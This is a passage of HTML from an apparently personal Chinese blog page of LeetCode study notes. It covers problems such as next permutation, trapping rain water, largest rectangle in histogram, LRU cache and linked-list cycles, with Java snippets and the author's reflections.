class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">after</span> <span class="operator">=</span> cur.next;</span><br><span class="line">        cur.next = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = after;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre;</span><br><span class="line">这种方式的坏处是，如果head指向<span class="literal">null</span>，就需要额外的判断，所以初值设置应该为：</span><br><span class="line">    cur指向head，pre指向<span class="literal">null</span>。</span><br></pre></td></tr></table></figure><h2 id="114、二叉树展开为链表（10月9日）"><a href="#114、二叉树展开为链表（10月9日）" class="headerlink" title="114、二叉树展开为链表（10月9日）"></a>114、二叉树展开为链表（10月9日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>经典的栈实现二叉树前序遍历</span><br><span class="line">    Deque&lt;TreeNode&gt; stack= <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;TreeNode&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="literal">null</span>||!stack.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//访问cur.val</span></span><br><span class="line">            list.add(cur);</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        cur = cur.right;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>我的想法，二叉树前序遍历。经典的二叉树前序遍历代码，不断遍历left指针，遇到<span class="literal">null</span>时弹栈，获取最近的right指针，再进行相同操作。没啥可说的，list中是前序遍历结果，通过perv、curr指针从<span class="number">1</span>遍历完即可。不用考虑末尾的双<span class="literal">null</span>，因为在原链表该节点也是双<span class="literal">null</span>。这样空间复杂度是O(n)，不是O(<span class="number">1</span>)。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>，空间复杂度为O(<span class="number">1</span>)的方法。涉及到指针这种引用类型，很多转引用、存储后的操作是不能保护值的，这在做这些题的时候要注意。题解的思想很简单，就是通过cur的left指针不为空时，就尽可能沿着right方向遍历cur.left节点，并将cur.right接在cur.left.right的最底层。因为对左子树来说，也是最右边的节点被最后访问，把root节点的右子树接在左子树最右边的底层是合理的。</span><br></pre></td></tr></table></figure><h2 id="31、下一个排列（10月10日）"><a href="#31、下一个排列（10月10日）" class="headerlink" title="31、下一个排列（10月10日）"></a>31、下一个排列（10月10日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，两次遍历。寻找下一个排列，本质是从后向前扫描时，要找到顺序对满足a[i]&lt;a[i+<span class="number">1</span>]，这时候从[i+<span class="number">1</span>,len-<span class="number">1</span>]范围内从后向前找到a[j]满足a[j]&gt;a[i]，因为此时[i+<span class="number">1</span>,len-<span class="number">1</span>]都不存在顺序对，故a[j]恰比a[i]大。替换a[i]和a[j]后，将[i+<span class="number">1</span>,len-<span class="number">1</span>]按顺序排列。</span><br><span class="line">    如“<span class="number">652341</span>”，第一个顺序对是“<span class="number">34</span>”，a[i]=<span class="number">3</span>，a[j]=<span class="number">4</span>，此时下一个排列是“<span class="number">652413</span>”，前面的<span class="number">2</span>不会替换<span class="number">3</span>，因为高位压阵，恰下一个；</span><br><span class="line">    如“<span class="number">652431</span>”，第一个顺序对是“<span class="number">24</span>”，a[i]=<span class="number">2</span>，a[j]=<span class="number">3</span>，此时下一个排列是“<span class="number">653124</span>”；</span><br><span class="line">    （没啥好说的，记住从后往前找顺序对，替换后在排列即可。）</span><br><span class="line"><span class="number">2.</span>实现过程，由于i+<span class="number">1</span>往后都是倒序排列，要实现顺序排列只需依次交换两端元素:</span><br><span class="line"><span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">        swap(nums,left,right);</span><br><span class="line">        left++;right--;</span><br><span class="line">    &#125;</span><br><span class="line">另外如果输入为“<span class="number">654321</span>”这种极端情况，第一次遍历结束必然i为-<span class="number">1</span>，判断此情况后，直接reverse(nums,i+<span class="number">1</span>);并返回即可。</span><br></pre></td></tr></table></figure><h2 id="33、搜索旋转排序数组（10月10日）"><a href="#33、搜索旋转排序数组（10月10日）" class="headerlink" title="33、搜索旋转排序数组（10月10日）"></a>33、搜索旋转排序数组（10月10日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，本来以为题意是，寻找旋转前数组中目标值的索引，先遍历找到旋转点i后，然后根据nums[<span class="number">0</span>]、nums[i]和target的大小关系，再到两段顺序序列中找到目标值索引，并根据长度恢复出旋转前索引。后来，发现题解好像就是找旋转后的索引，那一轮<span class="keyword">for</span>就搞定。但是，这时候复杂度为O(n)，不满足题意。</span><br><span class="line"><span class="number">2.</span>我的想法，二分查找。根据target和nums[<span class="number">0</span>]的关系，可以知道target出现在前一段序列or后一段序列。</span><br><span class="line">    如果出现在前一段序列，二分查找时mid&gt;=nums[<span class="number">0</span>]，说明mid也落入前一段，这时候可以按一般二分查找移动指针，否则只移动right指针到mid-<span class="number">1</span>；</span><br><span class="line">    如果出现在后一段序列，二分查找时mid&lt;nums[<span class="number">0</span>]（注意不带等于），说明mid也落入后一段，这时候可以按一般二分查找移动指针，否则只移动left指针到mid+<span class="number">1</span>；</span><br><span class="line">    （关键词，根据target和nums[<span class="number">0</span>]的关系进入不同的二分查找策略）</span><br></pre></td></tr></table></figure><h2 id="39、组合总和（10月10日）"><a href="#39、组合总和（10月10日）" class="headerlink" title="39、组合总和（10月10日）"></a>39、组合总和（10月10日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯。定义dfs函数如下，当sum等于目标值target时，将<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(result)添加到results中。但是，这样做得问题是会产生重复，如[<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>]，[<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>]，并且想不到去重策略。</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target,<span class="type">int</span> deep,<span class="type">int</span> sum,List&lt;Integer&gt; result,List&lt;List&lt;Integer&gt;&gt; results)</span></span><br><span class="line"><span class="number">2.</span>没必要记录深度，可以在返回时用combine.remove(combine.size() - <span class="number">1</span>)清除效果。</span><br><span class="line"><span class="number">3.</span>重复的原因在，没有按照一个方向选取元素，如[<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>]，假设取完元素<span class="number">2</span>后再取元素<span class="number">3</span>，则不能折回来再取元素<span class="number">2</span>，这时候就要记录遍历的index，遇到每个元素应该选择本元素（index不增）或者跳过（index+<span class="number">1</span>）。这时多一种最终判断，就是：</span><br><span class="line">    <span class="keyword">if</span>(index==candidates.length) <span class="keyword">return</span>; <span class="comment">//否则会栈溢出</span></span><br><span class="line">(关键词，按顺序加索引，不加深度)</span><br></pre></td></tr></table></figure><h2 id="40、接雨水（10月11日）"><a href="#40、接雨水（10月11日）" class="headerlink" title="40、接雨水（10月11日）"></a>40、接雨水（10月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，来自评论区的总结，找左右两边最大值中的小者，减去本身高度。这时候在[<span class="number">1</span>,heigh.length-<span class="number">1</span>]范围内从左到右遍历，遍历到heigh[j]时，寻找它左侧、右侧最大值maxLeft、maxRight，如果都小于等于它本身则result+<span class="number">0</span>，否则result+min&#123;maxLeft,maxRight&#125;-heigh[j]。时间复杂度O(n^<span class="number">2</span>)。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，动态规划。上一种解法中，时间复杂度为O(n^<span class="number">2</span>)的原因，在于需要搜索heigh[j]左右两侧的最大值，如果已知两边最值，时间复杂度就能降到O(n)。可以维护两个数组leftMax[]、rightMax[]记录每个j两侧最值，先通过从前向后、从后向前扫描初始化这两个数组。再从左向右遍历累加结果。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>，双指针。进一步观察发现，并不需要明确知道最大值，维护两个指针left、right，left从<span class="number">0</span>开始向右移动，right从height.length - <span class="number">1</span>开始向左移动，只要：</span><br><span class="line">    a.height[left]&lt;height[right]，则必有 leftMax&lt;rightMax，此时移动left指针</span><br><span class="line">    b.height[left]≥height[right]，则必有 leftMax≥rightMax，此时移动right指针</span><br><span class="line">    这样每次只移动更小处的指针。</span><br></pre></td></tr></table></figure><h2 id="84、柱状图中的最大矩形（10月11日）"><a href="#84、柱状图中的最大矩形（10月11日）" class="headerlink" title="84、柱状图中的最大矩形（10月11日）"></a>84、柱状图中的最大矩形（10月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>来自评论区的总结，题解讲得有点复杂，不利于理解。。。说白了，这题考的基础模型其实就是：在一维数组中对每一个数找到第一个比自己小的元素。这类“在一维数组中找第一个满足某种条件的数”的场景就是典型的单调栈应用场景。</span><br><span class="line"><span class="number">2.</span>第一次遇见单调栈，思路原理是，如果新元素小于栈顶元素，就一直弹栈，直到新元素大于栈顶元素：</span><br><span class="line">此时，栈顶元素是新元素左边，比新元素小的第一个元素；</span><br><span class="line">每次弹栈时，新元素是栈顶元素右边，比栈顶元素小的第一个元素；</span><br><span class="line">这样经过一次遍历，就能找到数组中每个元素左右两边第一个比它小的元素，当然还是更关注左边。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，单调栈。目标是计算每个高度限制的最大矩形面积，从左到右遍历高度：</span><br><span class="line"><span class="number">1.</span>假如新元素大于栈顶元素，则直接压栈，不是该高度的出场日；</span><br><span class="line"><span class="number">2.</span>假如新元素小于栈顶元素，就将栈顶元素出栈，对于这个出栈的元素A而言，</span><br><span class="line">a.新元素是A右边，比A小的第一个元素；</span><br><span class="line">b.新的栈顶元素，是A左边比A小的第一个元素；</span><br><span class="line">这样就得到了当前出栈高度左右两边的界限，从而可知当前出栈高度为上限的最大矩形面积。</span><br><span class="line">(简言之，所有面积都是出栈时候求的，因为只有出栈的元素，才会有左边界和右边界)</span><br><span class="line"><span class="number">4.</span>这道题解法的巧妙之处在于创建新数组new_heights，在原始数组左右两端各补一个<span class="number">0</span>。</span><br><span class="line"> <span class="type">int</span>[] new_heights = <span class="keyword">new</span> <span class="title class_">int</span>[heights.length + <span class="number">2</span>];</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; heights.length + <span class="number">1</span>; i++) &#123;</span><br><span class="line">     new_heights[i] = heights[i - <span class="number">1</span>];</span><br><span class="line">     &#125;</span><br><span class="line">这样做的好处是，能够省去很麻烦的边界判断：</span><br><span class="line">a.在前端补<span class="number">0</span>，使得第<span class="number">0</span>个元素有了左边界；</span><br><span class="line">b.在后端补<span class="number">0</span>，能避免由于输入数组是单调增，导致一直在压栈，只有出栈时有边界才会计算面积。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>本题是困难题，第一次接触单调栈，简直疯狂掉头发，希望能记住吧，弹栈有边界才更新面积。。。</span><br></pre></td></tr></table></figure><h2 id="70、爬楼梯（10月11日）"><a href="#70、爬楼梯（10月11日）" class="headerlink" title="70、爬楼梯（10月11日）"></a>70、爬楼梯（10月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>本题只需记住f(x)=f(x−<span class="number">1</span>)+f(x−<span class="number">2</span>)，因为对于这一阶台阶来说，可能是跨越一步上来的，也可能是跨越两步过来的：</span><br><span class="line">跨越一步上来时，f(x)和f(x-<span class="number">1</span>)的次数相同；跨越两步上来时，f(x)和f(x-<span class="number">2</span>)的次数相同，因此f(x)=f(x−<span class="number">1</span>)+f(x−<span class="number">2</span>)；</span><br><span class="line"><span class="number">2.</span>没啥说的，baby请你记住f(x)=f(x−<span class="number">1</span>)+f(x−<span class="number">2</span>)这个公式。爬楼梯啊爬楼梯~~~</span><br></pre></td></tr></table></figure><h2 id="46、全排列（10月17日）"><a href="#46、全排列（10月17日）" class="headerlink" title="46、全排列（10月17日）"></a>46、全排列（10月17日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题前面做过，一周没有刷题了手很生，看了题目只知道用回溯。实则全排列问题一定涉及交换，需要写swap辅助函数，此时本题就变简单了，只需维护index到达数组长度时放入结果，不到数组长度时index和后面每一个位置交换。</span><br></pre></td></tr></table></figure><h2 id="56、合并区间（10月17日）"><a href="#56、合并区间（10月17日）" class="headerlink" title="56、合并区间（10月17日）"></a>56、合并区间（10月17日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题前面也做过，甚至今天就用它优化了实验方案，但是又忘了该咋排序。解题逻辑是，双<span class="keyword">while</span>循环，每轮外围<span class="keyword">while</span>循环维护一个<span class="type">int</span>[] tmpResult，将其赋值为start区间，当下一区间和tmp区间产生交互时，将tmp区间右端更新为两者右端的最大值，并继续向右递进<span class="keyword">while</span>循环，直到不产生交互，将tmp区间放入结果，并从当前区间开展新一轮外层<span class="keyword">while</span>。</span><br><span class="line">    Arrays.sort(intervals,(<span class="type">int</span>[] e1,<span class="type">int</span>[] e2)-&gt;e1[<span class="number">0</span>]-e2[<span class="number">0</span>]); <span class="comment">//这里需要注明类型</span></span><br></pre></td></tr></table></figure><h2 id="55、跳跃游戏（10月18日）"><a href="#55、跳跃游戏（10月18日）" class="headerlink" title="55、跳跃游戏（10月18日）"></a>55、跳跃游戏（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，贪心算法。贪心算法(又称贪婪算法)是指,在对问题求解时,总是做出在当前看来是最好的选择。这道题需要理解题意，对于序列[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>]而言，第<span class="number">0</span>个位置跨度为<span class="number">3</span>，能到第<span class="number">3</span>个位置，不会更远。因此从左到右遍历，每次更新能到达的最远位置，如果最远位置大于（nums.length - <span class="number">1</span>）,则为True；遍历到末尾，则为<span class="literal">false</span>。注意只有遍历i&lt;=maxValue时，才去更新maxValue。</span><br></pre></td></tr></table></figure><h2 id="78、子集（10月18日）"><a href="#78、子集（10月18日）" class="headerlink" title="78、子集（10月18日）"></a>78、子集（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯。这道题可能做过，做出来还是比较容易。思路就是，维护一个表示深度的变量index，当index没到达nums.length时，可以选择result不添加index位置的元素进行回溯，或者添加index位置的元素进行回溯，回溯结束后从result删除该元素。</span><br></pre></td></tr></table></figure><h2 id="98、验证二叉搜索树（10月18日）"><a href="#98、验证二叉搜索树（10月18日）" class="headerlink" title="98、验证二叉搜索树（10月18日）"></a>98、验证二叉搜索树（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题更新了我对二叉搜索树的认识，它不是单纯的根节点大于左子节点，小于右子节点，而且根节点要大于左子树的所有节点，小于右子树的所有节点。这样，中序遍历二叉搜索树时，一定得到单调升的结果。比如[<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">3</span>,<span class="number">7</span>]</span><br><span class="line"><span class="number">5</span> - (<span class="number">4</span> <span class="number">6</span>)- ((<span class="literal">null</span> <span class="literal">null</span>) (<span class="number">3</span> <span class="number">7</span>))  <span class="comment">//其中右子树的节点3小于根节点5，所以不是二叉搜索树</span></span><br><span class="line">很自然想到，对于压栈的每个节点，要判断是否左节点小于它，再走到左节点；对于弹栈的每个节点，要判断是否右节点大于它，再走到右节点；此外，还要考虑到根节点<span class="number">5</span>大于很久以后的右节点<span class="number">3</span>这种情况，就很复杂。</span><br><span class="line">    当知道二叉树的中序遍历是单调升后，就可以省去以上判断，维护一个pre节点记录上次遍历到的有值节点，然后只判断是否单调升。</span><br><span class="line"> 此外，由于存在特殊测试用例，需要<span class="type">double</span> <span class="variable">preValue</span> <span class="operator">=</span> -Double.MAX_VALUE。</span><br></pre></td></tr></table></figure><h2 id="141、环形链表（10月18日）"><a href="#141、环形链表（10月18日）" class="headerlink" title="141、环形链表（10月18日）"></a>141、环形链表（10月18日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，快慢指针。这道题以前做过，稍微有点忘了，解法有两种：哈希表、快慢指针。用快慢指针做时，<span class="keyword">while</span>(slow!=fast)内部只需要在fast==<span class="literal">null</span>||fast.next==<span class="literal">null</span>为<span class="literal">true</span>时返回<span class="literal">false</span>，这样能保证fast.next.next能被访问到，那slow指针更能被访问到。</span><br></pre></td></tr></table></figure><h2 id="139、单词拆分（10月20日）"><a href="#139、单词拆分（10月20日）" class="headerlink" title="139、单词拆分（10月20日）"></a>139、单词拆分（10月20日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>最近做题陷入了怪圈，必须瞟眼答案关键字，有概率恍然大悟，然后遇到复杂的边界条件，总是差些火候写对，最终还是得看完整答案修修补补。比如这道题，我有经验设置<span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[s.length()+<span class="number">1</span>]; ，因为我知道<span class="number">0</span>位置不好对付就整体右移，但这时候边界条件又把我整怕了唉~</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，动态规划。设置子问题dp[i]表示前i个字符是否在wordDict中，从左到右遍历i，再从左到i遍历j，如果dp[j]为真且剩下到i的单词在wordDict中，则dp[i]为<span class="literal">true</span>。</span><br></pre></td></tr></table></figure><h2 id="142、环形链表Ⅱ（10月20日）"><a href="#142、环形链表Ⅱ（10月20日）" class="headerlink" title="142、环形链表Ⅱ（10月20日）"></a>142、环形链表Ⅱ（10月20日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashSet。从头开始遍历链表，将链表节点放入hashSet，如果hashSet中已经包含该节点，说明该节点是环的起始节点。</span><br><span class="line"><span class="number">2.</span>我的想法，快慢指针。快指针和慢指针相遇时，设从头到环入口的距离为a，环的周长为b，相遇位置与环入口距离为c，则快指针走过的路径长度为a+Xb+c，慢指针走过的路径长度为a+Yb+c，快慢指针的路径长度差值为b的整数倍。</span><br><span class="line">a+Xb+c = <span class="number">2</span>*(a+Yb+c)  =&gt;  a+c = (X-2Y)*b   <span class="comment">//环外的长度a + 未走满的部分c = 环周长的整数倍</span></span><br><span class="line">  求到这个有点闷，毕竟不知道确切多少倍，就无法得到周长。实际上，如果此时还有一个慢指针从起始点出发，他走距离a到达环入口，同时本慢指针从该点继续移动，也走距离a就能到达环入口，故这两个慢指针相遇点为环入口。</span><br><span class="line">    注意，写代码时外围 <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)，而不是<span class="keyword">while</span>(slow!=fast)，后者初始化时给slow、fast都赋值head不好做判断，且初始化为head.next、head.next.next会陷入无穷循环。</span><br></pre></td></tr></table></figure><h2 id="234、回文链表（10月20日）"><a href="#234、回文链表（10月20日）" class="headerlink" title="234、回文链表（10月20日）"></a>234、回文链表（10月20日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，快慢指针。先快慢指针找到链表中间，再将后半部分链表反转，再将前半部分和反转后的后半部分进行比较。</span><br><span class="line">    注意，快慢指针找链表中间需要dummy节点，这样能保证不管链表是单数还是双数，下一节点都是后半部分的起始节点。</span><br></pre></td></tr></table></figure><h2 id="283、移动零（10月21日）"><a href="#283、移动零（10月21日）" class="headerlink" title="283、移动零（10月21日）"></a>283、移动零（10月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，双指针。再次败北，麻了不说了。思路很简单，就是left指针指向已经处理好的序列，即最后一个非零树，右边指针一直向右遍历，如果该位置非零，则交换left、right指针指向的元素。</span><br></pre></td></tr></table></figure><h2 id="148、排序链表（10月21日）"><a href="#148、排序链表（10月21日）" class="headerlink" title="148、排序链表（10月21日）"></a>148、排序链表（10月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，优先队列。将链表节点放入最小堆priorityQueue，依次出堆后形成新链表。</span><br><span class="line"> PriorityQueue&lt;ListNode&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;(e1.val-e2.val));</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，归并排序。首先记住归并排序不是二分查找，是从左到右均分为长度<span class="number">2</span>的小段，排序后合并为长度<span class="number">4</span>的小段，重复此操作。本题的归并实现，是先用快慢指针找到链表中点，将前后两段排序后，再通过依次比较两个链表节点大小从而连接起来。</span><br><span class="line">    注意,这里递归是直接调用原函数sortList，需要在原函数判断<span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"><span class="comment">//没啥可说的，第二次用这个思路做，算是重写的时候快了点吧。</span></span><br></pre></td></tr></table></figure><h2 id="160、相交链表（10月21日）"><a href="#160、相交链表（10月21日）" class="headerlink" title="160、相交链表（10月21日）"></a>160、相交链表（10月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashSet。将链表headA的所有节点放入hashSet，遍历headB的节点，如果某节点在hashSet中已经存在，就返回该节点；如果循环结束，就返回<span class="literal">null</span>；</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，双指针。设链表headA非公共部分为a，链表headB非公共部分为b，链表公共部分为c，如果两个速度为<span class="number">1</span>的指针分别从headA、headB出发，则有：</span><br><span class="line">    a+c+b == b+c+a  <span class="comment">//即只有某指针走到末尾就切换赛道，必然会在下次c的起始节点相遇</span></span><br><span class="line">如果headA和headB不相交</span><br><span class="line">    a+<span class="number">0</span>+b = b+<span class="number">0</span>+a  <span class="comment">//即必然会在null相遇</span></span><br><span class="line"><span class="number">3.</span>这道题思路很多，归根结底是想解决掉链表headA和headB间的长度差值。</span><br></pre></td></tr></table></figure><h2 id="146、LRU缓存（10月22日）"><a href="#146、LRU缓存（10月22日）" class="headerlink" title="146、LRU缓存（10月22日）"></a>146、LRU缓存（10月22日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的思路，双项链表+hashMap。这道题需要维护双向链表节点head和tail，在初始化时连接两个节点如下。接下来不管put还是get操作，不能移动head和tail节点。</span><br><span class="line">    比如添加新节点到链表头部时，将新节点置为head，这是不对的，这会导致原始head节点（值为<span class="number">0</span>）被移动到链表中央。</span><br><span class="line">head.next = tail;</span><br><span class="line">tail.prev = head;</span><br><span class="line">当get或put操作一个已经存在的键时，需要从head.next开始遍历，直到tail结束寻找val为该键的链表节点，代码如下，这也是上面不能移动head和tail节点的原因：</span><br><span class="line">    <span class="type">DoubleNode</span> <span class="variable">temp</span> <span class="operator">=</span> head.next;</span><br><span class="line">    <span class="keyword">while</span>(temp!=tail)&#123;</span><br><span class="line">        <span class="keyword">if</span>(temp.val==key)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = temp.next;</span><br><span class="line">    &#125;</span><br><span class="line">此外，注意删除双向链表节点时指针和真实引用的区别即可。</span><br><span class="line">第二次做这道题，一直没敢做，以为还是做不出来，没想到调试着思路还挺流畅，再接再厉！！</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，双向链表+hashMap。官方题解中，hashMap定义如下：</span><br><span class="line">    Map&lt;Integer, DLinkedNode&gt; cache = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, DLinkedNode&gt;();</span><br><span class="line">双向链表中存储<span class="type">int</span> key，<span class="type">int</span> value，很容易理解，能够通过键直接确定节点位置，从而省去<span class="keyword">while</span>循环。</span><br></pre></td></tr></table></figure><h2 id="169、多数元素（10月23日）"><a href="#169、多数元素（10月23日）" class="headerlink" title="169、多数元素（10月23日）"></a>169、多数元素（10月23日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashMap。维护一个hashMap记录每个数字的出现次数，最后遍历hashMap返回出现次数超过n/<span class="number">2</span>的数字。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，排序。由于只有一个多数元素，且出现次数超过n/<span class="number">2</span>，所以排序好后数组中间位置元素一定是该元素。</span><br><span class="line"><span class="number">3.</span>写了下冒泡排序，第二行<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums.length-<span class="number">1</span>-i;j++)，但显然这种数据不适合冒泡，比Arrays.sort(nums);慢太多。</span><br></pre></td></tr></table></figure><h2 id="287、寻找重复数（10月23日）"><a href="#287、寻找重复数（10月23日）" class="headerlink" title="287、寻找重复数（10月23日）"></a>287、寻找重复数（10月23日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashSet。维护一个hashSet存储已经访问过的数字，如果某数字再次出现，则hashSet中存在，返回该数字。</span><br><span class="line"><span class="comment">//这道题有二分查找、快慢指针等方法，且题目要求了O(1)的时间复杂度没办法，就这样吧思路有点特殊，不想深入。</span></span><br></pre></td></tr></table></figure><h2 id="208、实现前缀树（10月24日）"><a href="#208、实现前缀树（10月24日）" class="headerlink" title="208、实现前缀树（10月24日）"></a>208、实现前缀树（10月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，前缀树。这是第二次做这道题，本来以为TrieNode中维护“children = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">26</span>];”，但如何指向下一节点却犯了难，实则TrieNode定义代码如下，在children节点中的isWord字段记录其是否为单词，其他操作顺水推舟：</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">TrieNode</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> TrieNode[] children;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> isWord;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">TrieNode</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.children = <span class="keyword">new</span> <span class="title class_">TrieNode</span>[<span class="number">26</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>前缀树主要用来实现字符串查找，解题的步骤有两步，第一步是创建前缀树，第二步是在前缀树中查找。这种题，需要熟悉TrieNode的定义、创建前缀树经典代码这两步惯性操作。</span><br></pre></td></tr></table></figure><h2 id="215、数组中第K个最大元素（10月24日）"><a href="#215、数组中第K个最大元素（10月24日）" class="headerlink" title="215、数组中第K个最大元素（10月24日）"></a>215、数组中第K个最大元素（10月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，最小堆。看到题目中第K个最大元素，就知道反过来要用最小堆，当堆大小超过K时，从堆顶弹出元素，直到所有元素经过堆处理，此时堆顶元素恰好为第K个最大元素。</span><br><span class="line">PriorityQueue&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;e1-e2);</span><br><span class="line"><span class="number">2.</span>我的想法，快速排序。手写快速排序是一个基本题目，需要注意以下函数配合：</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(end&gt;start)&#123;</span><br><span class="line">            <span class="comment">//调用getRandom，在mid两侧递归</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getRandom</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">randomNum</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(end-start+<span class="number">1</span>)+start;</span><br><span class="line">       <span class="comment">//修改nums内容，将范围内的数组，根据比randomNum的大小放在其左右两边</span></span><br><span class="line">       <span class="comment">//方法是维护small指针，指向最后一个比randomNum小的元素，因此从start-1开始</span></span><br><span class="line">   这道题还是看了以前的笔记，因为快排还是容易忘，特点就是在随机数两边分治递归。幸运的是看着笔记还是一下做出来了，本题的方法是快速排序+二分查找。只是二分查找位置不再是<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        而是<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> getRandom(nums,left,right);</span><br></pre></td></tr></table></figure><h2 id="560、和为K的子数组（10月24日）"><a href="#560、和为K的子数组（10月24日）" class="headerlink" title="560、和为K的子数组（10月24日）"></a>560、和为K的子数组（10月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>做了半小时滑动窗口，以为胜利在望，发现数据里有负数，歪江难受得雅痞。</span><br><span class="line"><span class="number">2.</span>我的想法，暴力破解。两层<span class="keyword">for</span>循环击败<span 